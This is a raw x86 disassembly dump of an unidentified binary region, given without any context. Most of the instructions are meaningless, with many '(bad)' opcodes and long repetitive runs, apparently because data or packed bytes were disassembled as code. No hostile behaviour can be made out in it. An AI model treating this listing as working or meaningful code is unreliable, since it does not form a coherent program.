  43ec3f:	loop   0x43eca4
  43ec41:	cdq    
  43ec42:	(bad)  
  43ec43:	cld    
  43ec44:	sub    BYTE PTR [ebp+0x58],dh
  43ec47:	arpl   WORD PTR cs:[ebp+eax*4+0x26a23d19],dx
  43ec4f:	sub    eax,0x1e92815f
  43ec54:	ins    BYTE PTR es:[edi],dx
  43ec55:	cwde   
  43ec56:	push   edi
  43ec57:	and    eax,0x2c7a8874
  43ec5c:	add    BYTE PTR [ebp+0x69],dh
  43ec5f:	cld    
  43ec60:	cmp    al,0x67
  43ec62:	and    esi,DWORD PTR ss:[eax+ebx*2-0x28]
  43ec67:	sbb    al,0x6b
  43ec69:	cmp    bh,BYTE PTR gs:[eax]
  43ec6c:	addr16 push edi
  43ec6e:	in     eax,0x26
  43ec70:	inc    esp
  43ec71:	ss cdq 
  43ec73:	cld    
  43ec74:	jo     0x43eced
  43ec76:	or     BYTE PTR [edi],ah
  43ec78:	ins    BYTE PTR es:[edi],dx
  43ec79:	add    BYTE PTR [eax],al
  43ec7b:	add    BYTE PTR [eax],al
  43ec7d:	add    BYTE PTR [eax+0x38],dl
  43ec80:	cmp    BYTE PTR [ecx+0x17],cl
  43ec83:	aas    
  43ec84:	daa    
  43ec85:	pop    ebp
  43ec86:	and    DWORD PTR [ecx-0x228a1e04],ebx
  43ec8c:	es ins BYTE PTR es:[edi],dx
  43ec8e:	adc    BYTE PTR ds:0xff174927,al
  43ec94:	es pop ebp
  43ec96:	add    DWORD PTR [ecx-0x278ad204],ebx
  43ec9c:	xor    DWORD PTR [ebx+0x14],esp
  43ec9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43eca0:	daa    
  43eca1:	inc    esp
  43eca2:	mov    dh,0xf8
  43eca4:	add    eax,ebp
  43eca6:	je     0x43ecaa
  43eca8:	stos   BYTE PTR es:[edi],al
  43eca9:	sub    cl,ch
  43ecab:	inc    esi
  43ecac:	les    edi,FWORD PTR [ecx]
  43ecae:	shl    BYTE PTR ds:0x12b246cc,cl
  43ecb4:	(bad)  
  43ecb5:	add    ebp,DWORD PTR [eax]
  43ecb7:	add    ebp,DWORD PTR [ebx-0x4cd82ed8]
  43ecbd:	sub    BYTE PTR [ecx-0x7ffc18bb],dh
  43ecc3:	add    ah,BYTE PTR [ebp-0x6cbb5ee4]
  43ecc9:	aaa    
  43ecca:	jne    0x43ecce
  43eccc:	sub    eax,0x9b27b405
  43ecd1:	inc    edi
  43ecd2:	mov    edx,0x98378044
  43ecd7:	add    bh,BYTE PTR [ebx+eax*1+0x24841440]
  43ecde:	and    DWORD PTR [edi],0x3cab
  43ece4:	add    BYTE PTR [eax],al
  43ece6:	add    BYTE PTR [ebx+0x61268435],dh
  43ecec:	sub    edx,DWORD PTR [edx+0x22]
  43ecef:	jne    0x43ecf3
  43ecf1:	push   eax
  43ecf2:	push   es
  43ecf3:	sub    esp,DWORD PTR [edi]
  43ecf5:	push   esi
  43ecf6:	cmp    BYTE PTR [esp+edx*1+0x44],bl
  43ecfa:	dec    eax
  43ecfb:	mov    BYTE PTR [edx],al
  43ecfd:	aaa    
  43ecfe:	push   es
  43ecff:	xor    BYTE PTR [ebx],ah
  43ed01:	xor    DWORD PTR [ecx],ebp
  43ed03:	xor    DWORD PTR [ebp-0x19],eax
  43ed06:	add    edx,ebp
  43ed08:	add    al,0x16
  43ed0a:	sub    DWORD PTR [ecx],esp
  43ed0c:	xor    al,0xc
  43ed0e:	daa    
  43ed0f:	sub    DWORD PTR [edx+eax*1],esi
  43ed12:	and    dh,BYTE PTR [ebp+0x2]
  43ed15:	sbb    al,0x5
  43ed17:	xor    al,0x26
  43ed19:	add    BYTE PTR [edx+0x19],cl
  43ed1c:	pop    ss
  43ed1d:	neg    BYTE PTR [ebx]
  43ed1f:	jne    0x43ed23
  43ed21:	push   eax
  43ed22:	add    eax,0xfd002728
  43ed27:	int3   
  43ed28:	sub    DWORD PTR [ebx-0xa],esp
  43ed2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ed2c:	sub    ebp,DWORD PTR [esi-0x23]
  43ed2f:	mov    bh,0x30
  43ed31:	popa   
  43ed32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ed33:	mov    es,WORD PTR [edx]
  43ed35:	add    BYTE PTR [esi+0x1b2d49ba],ch
  43ed3b:	push   edi
  43ed3c:	and    eax,0xc76d56c
  43ed41:	add    BYTE PTR [esi-0x32c11e5d],dl
  43ed47:	pop    edx
  43ed48:	xor    BYTE PTR [ebx-0x46],ah
  43ed4b:	add    BYTE PTR [eax],al
  43ed4d:	add    BYTE PTR [eax],al
  43ed4f:	add    BYTE PTR [ebx+0x36],ah
  43ed52:	imul   edi,DWORD PTR [edx-0x7098cf96],0xc8ffe14f
  43ed5c:	jbe    0x43ed91
  43ed5e:	dec    ebp
  43ed5f:	test   al,0xb3
  43ed61:	xor    BYTE PTR [ebx-0x78],ah
  43ed64:	dec    edx
  43ed65:	and    eax,0x2c4d7743
  43ed6a:	je     0x43ed55
  43ed6c:	jbe    0x43ed56
  43ed6e:	call   DWORD PTR [ebp+0x5f42e143]
  43ed74:	call   0x632e:0x923a742c
  43ed7b:	dec    edx
  43ed7c:	lea    eax,[edx]
  43ed7e:	add    BYTE PTR [esi],al
  43ed80:	jno    0x43edb5
  43ed82:	dec    ebp
  43ed83:	sub    BYTE PTR [edx],bh
  43ed85:	sub    al,0x73
  43ed87:	dec    esp
  43ed88:	aaa    
  43ed89:	and    eax,0x30543e74
  43ed8e:	gs and al,0x6f
  43ed91:	and    eax,0x2681d6a
  43ed96:	add    bh,dl
  43ed98:	jbe    0x43edcd
  43ed9a:	dec    ebp
  43ed9b:	sub    BYTE PTR [esi+0x2b],cl
  43ed9e:	pop    ebp
  43ed9f:	adc    eax,0x255
  43eda4:	xchg   edi,eax
  43eda5:	add    al,0x4f
  43eda7:	push   ebx
  43eda8:	dec    ebp
  43eda9:	inc    edi
  43edaa:	ins    BYTE PTR es:[edi],dx
  43edab:	outs   dx,DWORD PTR ds:[esi]
  43edac:	outs   dx,DWORD PTR ds:[esi]
  43edad:	jmp    0xe4b563ee
  43edb2:	jae    0x43edb4
  43edb4:	add    BYTE PTR [eax],al
  43edb6:	add    BYTE PTR [eax],al
  43edb8:	add    BYTE PTR ds:0xd534f04,ah
  43edbe:	aaa    
  43edbf:	pop    ebp
  43edc0:	outs   dx,BYTE PTR ds:[esi]
  43edc1:	inc    eax
  43edc2:	add    al,0x44
  43edc4:	add    BYTE PTR [ebx],al
  43edc6:	aaa    
  43edc7:	cmp    DWORD PTR [edx+0x31],edx
  43edca:	out    0x6d,eax
  43edcc:	add    ah,al
  43edce:	push   es
  43edcf:	pop    esi
  43edd0:	jb     0x43ee13
  43edd2:	jmp    0xd674522f
  43edd7:	pusha  
  43edd8:	outs   dx,BYTE PTR ds:[esi]
  43edd9:	repnz loop 0x43eddb
  43eddc:	jmp    DWORD PTR [ebp-0xf9aa0fa]
  43ede2:	in     al,0x63
  43ede4:	fs out dx,al
  43ede6:	cld    
  43ede7:	gs data16 jmp 0x43edee
  43edeb:	dec    edi
  43edec:	push   ebx
  43eded:	mov    esi,0xba322b32
  43edf2:	out    0x6b,eax
  43edf4:	ins    BYTE PTR es:[edi],dx
  43edf5:	fadd   QWORD PTR [ebx]
  43edf7:	lidtd  [esp+ecx*2-0x29d6b6a8]
  43edff:	data16 jb 0x43ee32
  43ee02:	inc    ebp
  43ee03:	pop    ebp
  43ee04:	jb     0x43ee26
  43ee06:	xor    eax,0xe77e6f74
  43ee0b:	(bad)  
  43ee0c:	call   DWORD PTR [edi]
  43ee0e:	add    al,0x3b
  43ee10:	jb     0x43ee77
  43ee12:	(bad)  
  43ee13:	jae    0x43ee6a
  43ee15:	push   0xffffffd6
  43ee17:	imul   ebp,DWORD PTR [edi-0x80],0x745ae7
  43ee1e:	add    BYTE PTR [eax],al
  43ee20:	add    BYTE PTR [eax],al
  43ee22:	push   eax
  43ee23:	jecxz  0x43ee98
  43ee25:	popa   
  43ee26:	jne    0x43edd1
  43ee28:	cld    
  43ee29:	push   ds
  43ee2a:	jne    0x43ee18
  43ee2c:	and    BYTE PTR [esi+0x9],ch
  43ee2f:	in     eax,dx
  43ee30:	and    BYTE PTR [eax+edx*1-0x6b],ch
  43ee34:	and    DWORD PTR ds:0x67309bd8,edi
  43ee3a:	rol    DWORD PTR [edx],cl
  43ee3c:	and    ebx,DWORD PTR [edi-0x17]
  43ee3f:	into   
  43ee40:	inc    esi
  43ee41:	outs   dx,BYTE PTR ds:[esi]
  43ee42:	retf   0x53ce
  43ee45:	je     0x43ee29
  43ee47:	mov    ebx,0x52750021
  43ee4c:	cld    
  43ee4d:	cmp    al,0xd8
  43ee4f:	pop    ebx
  43ee50:	xor    BYTE PTR [ecx-0x3b],cl
  43ee53:	(bad)  
  43ee54:	push   ds
  43ee55:	dec    ebp
  43ee56:	lods   al,BYTE PTR ds:[esi]
  43ee57:	pop    esp
  43ee58:	xor    BYTE PTR [ebx-0x68],ah
  43ee5b:	jl     0x43ee8d
  43ee5d:	imul   esp,DWORD PTR [edi+0x7500578e],0x983cfc9b
  43ee67:	jnp    0x43ee99
  43ee69:	cmp    eax,0x63342099
  43ee6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ee6f:	sbb    eax,0xa9906e20
  43ee74:	cld    
  43ee75:	sub    esi,DWORD PTR [ebp+0x6c]
  43ee78:	and    DWORD PTR [esi+0x61],ebp
  43ee7b:	pushw  ds
  43ee7d:	jae    0x43eecf
  43ee7f:	in     al,dx
  43ee80:	outs   dx,BYTE PTR es:[esi]
  43ee82:	popa   
  43ee83:	xor    ah,BYTE PTR [edx]
  43ee85:	add    BYTE PTR [bx+si],al
  43ee88:	add    BYTE PTR [eax],al
  43ee8a:	add    BYTE PTR [esi+0x4a],dl
  43ee8d:	cmp    BYTE PTR [ebx+0x46],ah
  43ee90:	loop   0x43eeab
  43ee92:	dec    ebp
  43ee93:	dec    ecx
  43ee94:	cmp    BYTE PTR [esi],ch
  43ee96:	arpl   WORD PTR [ebp+0x6],si
  43ee99:	add    al,0x3d
  43ee9b:	sbb    bl,bl
  43ee9d:	aaa    
  43ee9e:	inc    esp
  43ee9f:	and    cl,bl
  43eea1:	pop    ds
  43eea2:	addr16 push ss
  43eea4:	add    cl,BYTE PTR [eax]
  43eea6:	cmp    BYTE PTR [esi],dl
  43eea8:	inc    ebx
  43eea9:	add    al,0x32
  43eeab:	or     DWORD PTR [ecx],ebp
  43eead:	or     DWORD PTR ds:0x29132128,ebx
  43eeb3:	inc    eax
  43eeb4:	das    
  43eeb5:	adc    DWORD PTR [eax],edi
  43eeb7:	push   ss
  43eeb8:	sbb    dh,bl
  43eeba:	add    eax,DWORD PTR [edi-0x32b9e8fd]
  43eec0:	inc    edi
  43eec1:	out    dx,eax
  43eec2:	xor    ecx,esp
  43eec4:	adc    bl,bl
  43eec6:	inc    edx
  43eec7:	(bad)  
  43eec8:	adc    bl,dl
  43eeca:	push   edx
  43eecb:	leave  
  43eecc:	sub    eax,0x1ab628d5
  43eed1:	out    0x3,eax
  43eed3:	xor    BYTE PTR [eax],0xa0
  43eed6:	push   ebx
  43eed7:	mov    eax,ds:0x96ddf4d1
  43eedc:	cs ret 
  43eede:	add    edx,ecx
  43eee0:	add    ah,BYTE PTR [eax-0x6ad856e3]
  43eee6:	sbb    eax,0x28b61696
  43eeeb:	mov    DWORD PTR [ecx-0x7e],eax
  43eeee:	push   ds
  43eeef:	add    BYTE PTR [eax],al
  43eef1:	add    BYTE PTR [eax],al
  43eef3:	add    BYTE PTR [eax+0x7544842b],dl
  43eef9:	add    ah,BYTE PTR [edx+0x4]
  43eefc:	mov    dl,0x2c
  43eefe:	jae    0x43ef28
  43ef00:	arpl   WORD PTR [esp+ecx*4],bp
  43ef03:	aaa    
  43ef04:	cmp    esp,DWORD PTR [edi]
  43ef06:	mov    BYTE PTR [edi],ah
  43ef08:	aaa    
  43ef09:	sub    edx,DWORD PTR [ebx+0x29]
  43ef0c:	jne    0x43ef10
  43ef0e:	inc    eax
  43ef0f:	add    al,0x3d
  43ef11:	push   ss
  43ef12:	pop    ebx
  43ef13:	xor    al,0x3a
  43ef15:	pop    ss
  43ef16:	inc    esp
  43ef17:	xor    cl,BYTE PTR [edx+0x4b]
  43ef1a:	push   ecx
  43ef1b:	es dec esp
  43ef1d:	inc    ebx
  43ef1e:	out    0x3,eax
  43ef20:	and    al,BYTE PTR [edx]
  43ef22:	add    BYTE PTR [eax],ah
  43ef24:	mov    edx,DWORD PTR [esi]
  43ef26:	arpl   WORD PTR [ebx],di
  43ef28:	and    DWORD PTR [ecx],0x74
  43ef2b:	sub    bh,BYTE PTR [edx+0x28]
  43ef2e:	push   0x4
  43ef30:	push   esi
  43ef31:	push   ss
  43ef32:	aas    
  43ef33:	jmp    0x20441eae
  43ef38:	arpl   WORD PTR [esi],dx
  43ef3a:	arpl   bx,di
  43ef3c:	pop    eax
  43ef3d:	and    DWORD PTR [edx+ebp*1-0x59],esi
  43ef41:	cmp    eax,0x2ccc025d
  43ef46:	ins    BYTE PTR es:[edi],dx
  43ef47:	sub    BYTE PTR [ecx+0x33],bh
  43ef4a:	add    BYTE PTR [ecx-0x518fe95e],dh
  43ef50:	xchg   BYTE PTR [ecx],ah
  43ef52:	push   0xffffffbb
  43ef54:	popf   
  43ef55:	sub    eax,0xc473
  43ef5a:	add    BYTE PTR [eax],al
  43ef5c:	add    BYTE PTR [edi+0x76e93f16],al
  43ef62:	dec    esp
  43ef63:	add    BYTE PTR [ecx-0x578fe996],dh
  43ef69:	push   edx
  43ef6a:	es dec esi
  43ef6c:	les    ebp,FWORD PTR [ecx+0x11]
  43ef6f:	arpl   WORD PTR [edx-0x779cb59e],bx
  43ef75:	pop    edx
  43ef76:	and    DWORD PTR [esi-0x66],ebp
  43ef79:	mov    cl,0x2
  43ef7b:	add    BYTE PTR [edx+0x7d744a76],dh
  43ef81:	inc    esi
  43ef82:	dec    edi
  43ef83:	arpl   WORD PTR [edi+0x78634c9a],cx
  43ef89:	lods   eax,DWORD PTR ds:[esi]
  43ef8a:	and    DWORD PTR [ebp+0x75],ebp
  43ef8d:	cmp    DWORD PTR [edx],eax
  43ef8f:	add    BYTE PTR [esi+0x71],bh
  43ef92:	inc    ebp
  43ef93:	push   0x55
  43ef95:	call   0x704b:0x8d4c6a2c
  43ef9c:	inc    esp
  43ef9d:	arpl   bp,bx
  43ef9f:	(bad)  
  43efa0:	jmp    DWORD PTR [edi]
  43efa2:	push   es
  43efa3:	inc    ecx
  43efa4:	outs   dx,BYTE PTR ds:[esi]
  43efa5:	push   0x396e69e5
  43efaa:	fidivr DWORD PTR [edx]
  43efac:	ins    BYTE PTR es:[edi],dx
  43efad:	arpl   bx,dx
  43efaf:	pop    esp
  43efb0:	dec    eax
  43efb1:	ins    DWORD PTR es:[edi],dx
  43efb2:	cld    
  43efb3:	arpl   WORD PTR [ecx+edi*2+0x6],bp
  43efb7:	pop    esp
  43efb8:	add    BYTE PTR [edx+ebx*8+0x73],dl
  43efbc:	jo     0x43effd
  43efbe:	in     eax,0x65
  43efc0:	add    BYTE PTR fs:[eax],al
  43efc3:	add    BYTE PTR [eax],al
  43efc5:	add    BYTE PTR [esi-0x1b],bl
  43efc8:	push   0x73d17975
  43efcd:	inc    ebp
  43efce:	fs inc ecx
  43efd0:	add    BYTE PTR [eax],al
  43efd2:	jno    0x43efda
  43efd4:	dec    eax
  43efd5:	je     0x43f00f
  43efd7:	ror    BYTE PTR [edx+0x65],1
  43efda:	inc    edx
  43efdb:	in     al,0x49
  43efdd:	gs sub eax,0x28735cd5
  43efe3:	inc    ebp
  43efe4:	js     0x43f03d
  43efe6:	dec    esp
  43efe7:	add    BYTE PTR [ebx+0x73fde500],ch
  43efed:	gs out dx,al
  43efef:	std    
  43eff0:	pop    esp
  43eff1:	je     0x43eff2
  43eff3:	in     al,0x73
  43eff5:	push   ebx
  43eff6:	clc    
  43eff7:	loopne 0x43f06c
  43eff9:	jne    0x43efea
  43effb:	inc    edx
  43effc:	pop    ecx
  43effd:	ins    BYTE PTR es:[edi],dx
  43effe:	lock loope 0x43f059
  43f001:	arpl   di,si
  43f003:	inc    eax
  43f004:	add    BYTE PTR [eax],al
  43f006:	xchg   edi,eax
  43f007:	push   es
  43f008:	inc    ecx
  43f009:	outs   dx,BYTE PTR ds:[esi]
  43f00a:	push   0xf96e69e4
  43f00f:	ror    DWORD PTR [eax+0x75],cl
  43f012:	stc    
  43f013:	shl    DWORD PTR [eax+0x44],1
  43f016:	sub    eax,0x2a4158da
  43f01b:	fbld   TBYTE PTR [eax+0x6c]
  43f01e:	jne    0x43f06a
  43f020:	push   ds
  43f021:	ins    BYTE PTR es:[edi],dx
  43f022:	pop    eax
  43f023:	test   eax,0xd2759ffc
  43f028:	sbb    DWORD PTR [eax+eax*1+0x0],esi
  43f02c:	add    BYTE PTR [eax],al
  43f02e:	add    BYTE PTR [eax],bl
  43f030:	xlat   BYTE PTR ds:[ebx]
  43f031:	sbb    DWORD PTR [ebx+0x21],esp
  43f034:	mul    DWORD PTR [eax]
  43f036:	pop    edi
  43f037:	sbb    ebx,esp
  43f039:	adc    al,0x6c
  43f03b:	adc    dh,ch
  43f03d:	sub    edi,DWORD PTR [edi]
  43f03f:	jne    0x43f08e
  43f041:	std    
  43f042:	inc    esi
  43f043:	sbb    edi,ebp
  43f045:	and    BYTE PTR [esi+0x13],ch
  43f048:	push   es
  43f049:	cmp    BYTE PTR [ebp+0x10],cl
  43f04c:	popf   
  43f04d:	cmp    esi,DWORD PTR [eax-0x17]
  43f050:	repnz sbb ch,BYTE PTR [edx-0x4c]
  43f054:	test   eax,0xe17559fc
  43f059:	aaa    
  43f05a:	je     0x43f041
  43f05c:	pop    eax
  43f05d:	and    DWORD PTR [edx-0x27],ebp
  43f060:	push   edi
  43f061:	and    DWORD PTR [edi-0x40],ebp
  43f064:	into   
  43f065:	das    
  43f066:	je     0x43f012
  43f068:	test   eax,0x6c7543fc
  43f06d:	and    DWORD PTR [eax+ecx*8+0x57],esi
  43f071:	sbb    BYTE PTR ds:0x6314c894,bh
  43f077:	mov    eax,0x9c6e305b
  43f07c:	push   edx
  43f07d:	sbb    ah,BYTE PTR [edx-0x5e]
  43f080:	push   esp
  43f081:	cld    
  43f082:	mov    bl,0x75
  43f084:	bound  ebx,QWORD PTR [edx]
  43f086:	je     0x43f020
  43f088:	ja     0x43f0a4
  43f08a:	arpl   WORD PTR [ecx+0x46742178],ax
  43f090:	adc    eax,0x741e
  43f095:	add    BYTE PTR [eax],al
  43f097:	add    BYTE PTR [eax+0x18],ah
  43f09a:	inc    eax
  43f09b:	pop    edi
  43f09c:	push   ecx
  43f09d:	sbb    eax,0x2565f1f
  43f0a2:	dec    esi
  43f0a3:	push   ebx
  43f0a4:	jne    0x43f0a8
  43f0a6:	ss add al,0x3d
  43f0a9:	push   ss
  43f0aa:	pop    ebx
  43f0ab:	xor    al,0x82
  43f0ad:	es inc ebx
  43f0af:	push   esi
  43f0b0:	push   esi
  43f0b1:	adc    DWORD PTR [ecx+eiz*1],edi
  43f0b4:	and    BYTE PTR [esi],dl
  43f0b6:	das    
  43f0b7:	and    DWORD PTR [edx+0x26],ecx
  43f0ba:	dec    esp
  43f0bb:	adc    BYTE PTR ss:[ebx],dh
  43f0be:	out    0x3,eax
  43f0c0:	inc    BYTE PTR [ecx]
  43f0c2:	xor    BYTE PTR [edx],bl
  43f0c4:	or     DWORD PTR ds:0x16161a15,esp
  43f0ca:	cmp    BYTE PTR [ecx],dh
  43f0cc:	push   ss
  43f0cd:	adc    BYTE PTR [eax],dl
  43f0cf:	cmp    eax,DWORD PTR ds:0xdf1b1016
  43f0d5:	inc    ebx
  43f0d6:	out    0x3,eax
  43f0d8:	lsl    esp,WORD PTR [eax]
  43f0db:	sbb    ch,cl
  43f0dd:	pop    ds
  43f0de:	cmc    
  43f0df:	sbb    esi,edx
  43f0e1:	push   cs
  43f0e2:	mov    eax,0xe014d630
  43f0e7:	cmp    al,ch
  43f0e9:	push   cs
  43f0ea:	rcr    BYTE PTR [edx],0xcf
  43f0ed:	xor    edi,esp
  43f0ef:	add    esp,DWORD PTR [ebx+ecx*2+0x3fbf3cb1]
  43f0f6:	xchg   ebx,eax
  43f0f7:	fst    DWORD PTR [esi+0x3c326]
  43f0fd:	add    BYTE PTR [eax],al
  43f0ff:	add    BYTE PTR [eax],al
  43f101:	lods   al,BYTE PTR ds:[esi]
  43f102:	inc    esi
  43f103:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f104:	inc    esp
  43f105:	(bad)  
  43f106:	cs (bad) 
  43f108:	cmc    
  43f109:	pop    esp
  43f10a:	push   ds
  43f10b:	mov    edx,DWORD PTR [edi]
  43f10d:	jne    0x43f111
  43f10f:	adc    al,BYTE PTR [edi+ebp*4]
  43f112:	pop    ds
  43f113:	xchg   ebx,eax
  43f114:	push   eax
  43f115:	mov    BYTE PTR [edi],bl
  43f117:	jne    0x43f15b
  43f119:	push   esi
  43f11a:	push   cs
  43f11b:	mov    al,0x19
  43f11d:	push   edi
  43f11e:	sub    DWORD PTR [eax],eax
  43f120:	jmp    0x9f44169b
  43f125:	xchg   ebp,eax
  43f126:	push   cs
  43f127:	aas    
  43f128:	pop    ecx
  43f129:	jo     0x43f103
  43f12b:	jb     0x43f174
  43f12d:	xchg   edi,eax
  43f12e:	and    eax,0x258b2f6e
  43f133:	arpl   cx,bp
  43f135:	jbe    0x43f0d4
  43f137:	push   DWORD PTR [esi]
  43f139:	push   esp
  43f13a:	push   cs
  43f13b:	push   ebx
  43f13c:	cmp    dl,BYTE PTR [eax+ebp*1+0x43]
  43f140:	inc    edi
  43f141:	fs sub eax,0x2e341f00
  43f147:	aas    
  43f148:	cmp    DWORD PTR [eax-0x19],edx
  43f14b:	sub    eax,0x6c266acf
  43f150:	jmp    0x2643cdcb
  43f155:	push   esp
  43f156:	push   cs
  43f157:	aas    
  43f158:	or     eax,0x4741298
  43f15d:	mov    ds:0x950d3f27,eax
  43f162:	sub    BYTE PTR [ebx-0x6],ah
  43f165:	add    BYTE PTR [eax],al
  43f167:	add    BYTE PTR [eax],al
  43f169:	add    BYTE PTR [ebx+0x76e96d25],ah
  43f16f:	inc    ecx
  43f170:	push   eax
  43f171:	mov    cl,0x82
  43f173:	xor    bh,BYTE PTR [edi]
  43f175:	mov    ecx,0x9d43ec81
  43f17a:	add    BYTE PTR [edx],0x0
  43f17d:	lahf   
  43f17e:	jns    0x43f1bb
  43f180:	arpl   WORD PTR [ebx-0x1696d3a0],di
  43f186:	jbe    0x43f128
  43f188:	add    edi,DWORD PTR [ebp+edx*2+0x61995d2d]
  43f18f:	add    al,BYTE PTR [eax]
  43f191:	(bad)  
  43f193:	sub    al,0x63
  43f195:	test   BYTE PTR [ebx+0x25],cl
  43f198:	je     0x43f183
  43f19a:	jbe    0x43f13d
  43f19c:	add    eax,DWORD PTR [eax]
  43f19e:	or     edx,esp
  43f1a0:	fs arpl cx,di
  43f1a3:	aam    0xff
  43f1a5:	(bad)  
  43f1a6:	call   0x61b448a8
  43f1ab:	iret   
  43f1ac:	pop    esp
  43f1ad:	arpl   WORD PTR ds:0x48006bfa,di
  43f1b3:	call   DWORD PTR [esi+0x75]
  43f1b6:	cmp    dl,dl
  43f1b8:	popaw  
  43f1ba:	int3   
  43f1bb:	add    al,0xec
  43f1bd:	add    al,0x49
  43f1bf:	stc    
  43f1c0:	fs ins DWORD PTR es:[edi],dx
  43f1c2:	cmp    edx,esp
  43f1c4:	pop    esp
  43f1c5:	add    BYTE PTR ds:0x60775702,dh
  43f1cb:	sti    
  43f1cc:	pusha  
  43f1cd:	add    BYTE PTR [eax],al
  43f1cf:	add    BYTE PTR [eax],al
  43f1d1:	add    BYTE PTR [eax],al
  43f1d3:	retf   0x56fe
  43f1d6:	jbe    0x43f247
  43f1d8:	cld    
  43f1d9:	outs   dx,BYTE PTR ds:[esi]
  43f1da:	jo     0x43f23a
  43f1dc:	std    
  43f1dd:	gs je  0x43f252
  43f1e0:	inc    bh
  43f1e2:	add    ebx,DWORD PTR [ebx+0x6c6e6ad4]
  43f1e8:	into   
  43f1e9:	pusha  
  43f1ea:	outs   dx,BYTE PTR ds:[esi]
  43f1eb:	pusha  
  43f1ec:	loop   0x43f1ed
  43f1ee:	inc    DWORD PTR [eax-0x67]
  43f1f1:	imul   esi,DWORD PTR [esi+ebp*1-0x21],0x64
  43f1f6:	jo     0x43f254
  43f1f8:	add    al,0x6f
  43f1fa:	add    al,0x2d
  43f1fc:	fisubr WORD PTR [edx+0x0]
  43f1ff:	mov    ah,0x2
  43f201:	gs gs dec ecx
  43f204:	fbld   TBYTE PTR [edi+0x72]
  43f207:	sbb    al,0x4
  43f209:	xchg   esi,eax
  43f20a:	add    ecx,DWORD PTR [ebx]
  43f20c:	jmp    0xd31f667c
  43f211:	(bad)  
  43f212:	(bad)  
  43f213:	jmp    0xeea75fe6
  43f218:	out    0x25,eax
  43f21a:	fs jne 0x43f29a
  43f21d:	adc    BYTE PTR [eax],al
  43f21f:	jne    0x43f2a0
  43f221:	clc    
  43f222:	dec    esp
  43f223:	pop    eax
  43f224:	adc    eax,0x7e59673f
  43f229:	dec    esp
  43f22a:	imul   ecx,DWORD PTR [edi+edi*2+0x28],0xfca96763
  43f232:	xchg   BYTE PTR [esi-0x30],dh
  43f235:	sub    BYTE PTR [eax+eax*1+0x0],dh
  43f239:	add    BYTE PTR [eax],al
  43f23b:	add    BYTE PTR [ebp+0x2e],al
  43f23e:	xor    BYTE PTR [eax+ebx*2+0x4b],al
  43f242:	sub    DWORD PTR [ecx+0x26],esp
  43f245:	sub    eax,0x48236732
  43f24a:	cmp    eax,0xf8a17500
  43f24f:	dec    ebp
  43f250:	sub    DWORD PTR ds:0x42226a49,edi
  43f256:	push   ss
  43f257:	fs jne 0x43f2c3
  43f25a:	std    
  43f25b:	inc    eax
  43f25c:	adc    ch,ch
  43f25e:	inc    edx
  43f25f:	jae    0x43f268
  43f261:	sti    
  43f262:	sbb    BYTE PTR [edx+0x1],ch
  43f265:	fnstenv [ecx]
  43f267:	imul   edx,esi,0x756d3306
  43f26d:	jl     0x43f267
  43f26f:	push   edx
  43f270:	rol    DWORD PTR [ecx],cl
  43f272:	sbb    eax,0x1995d16a
  43f277:	fs mov eax,0xc56323a1
  43f27d:	lods   eax,DWORD PTR ds:[esi]
  43f27e:	adc    eax,0x1567d369
  43f283:	ins    BYTE PTR es:[edi],dx
  43f284:	sar    DWORD PTR [esi-0x798affce],0xf8
  43f28b:	dec    esp
  43f28c:	nop
  43f28d:	dec    ebp
  43f28e:	dec    ecx
  43f28f:	push   0xffffff8d
  43f291:	retf   0x6416
  43f294:	mov    DWORD PTR [esi+0x28d4318],edi
  43f29a:	xchg   BYTE PTR [esi],bl
  43f29c:	test   DWORD PTR [esi],ecx
  43f29e:	nop
  43f29f:	sbb    BYTE PTR [eax],al
  43f2a1:	add    BYTE PTR [eax],al
  43f2a3:	add    BYTE PTR [eax],al
  43f2a5:	pop    DWORD PTR [eax-0x80]
  43f2a8:	pop    ss
  43f2a9:	sbb    DWORD PTR ds:0x14d0395,0x236d1ea2
  43f2b3:	test   BYTE PTR [ebx],dh
  43f2b5:	imul   esi,DWORD PTR [edi],0x1e4f227f
  43f2bb:	jnp    0x43f2db
  43f2bd:	arpl   bx,dx
  43f2bf:	out    0x3,al
  43f2c1:	jne    0x43f2c5
  43f2c3:	out    0x3,eax
  43f2c5:	jne    0x43f2c9
  43f2c7:	out    0x3,eax
  43f2c9:	jne    0x43f2cd
  43f2cb:	out    0x3,eax
  43f2cd:	jne    0x43f2d1
  43f2cf:	out    0x3,eax
  43f2d1:	jne    0x43f2d5
  43f2d3:	out    0x3,eax
  43f2d5:	jne    0x43f2d9
  43f2d7:	out    0x3,eax
  43f2d9:	jne    0x43f2dd
  43f2db:	out    0x3,eax
  43f2dd:	jne    0x43f2e1
  43f2df:	out    0x3,eax
  43f2e1:	jne    0x43f2e5
  43f2e3:	out    0x3,eax
  43f2e5:	jne    0x43f2e9
  43f2e7:	out    0x3,eax
  43f2e9:	jne    0x43f2ed
  43f2eb:	out    0x3,eax
  43f2ed:	jne    0x43f2f1
  43f2ef:	out    0x3,eax
  43f2f1:	jne    0x43f2f5
  43f2f3:	out    0x3,eax
  43f2f5:	jne    0x43f2f9
  43f2f7:	out    0x3,eax
  43f2f9:	jne    0x43f2fd
  43f2fb:	out    0x3,eax
  43f2fd:	jne    0x43f301
  43f2ff:	out    0x3,eax
  43f301:	jne    0x43f305
  43f303:	out    0x3,eax
  43f305:	jne    0x43f309
  43f307:	out    0x3,eax
  43f309:	add    BYTE PTR [eax],al
  43f30b:	add    BYTE PTR [eax],al
  43f30d:	add    BYTE PTR [ebp+0x2],dh
  43f310:	out    0x3,eax
  43f312:	jne    0x43f316
  43f314:	out    0x3,eax
  43f316:	jne    0x43f31a
  43f318:	out    0x3,eax
  43f31a:	jne    0x43f31e
  43f31c:	add    cl,ch
  43f31e:	jbe    0x43f322
  43f320:	add    cl,ch
  43f322:	jbe    0x43f326
  43f324:	add    cl,ch
  43f326:	jbe    0x43f32a
  43f328:	add    cl,ch
  43f32a:	jbe    0x43f32e
  43f32c:	add    cl,ch
  43f32e:	jbe    0x43f332
  43f330:	add    cl,ch
  43f332:	jbe    0x43f336
  43f334:	add    cl,ch
  43f336:	jbe    0x43f33a
  43f338:	add    cl,ch
  43f33a:	jbe    0x43f33e
  43f33c:	add    cl,ch
  43f33e:	jbe    0x43f342
  43f340:	add    cl,ch
  43f342:	jbe    0x43f346
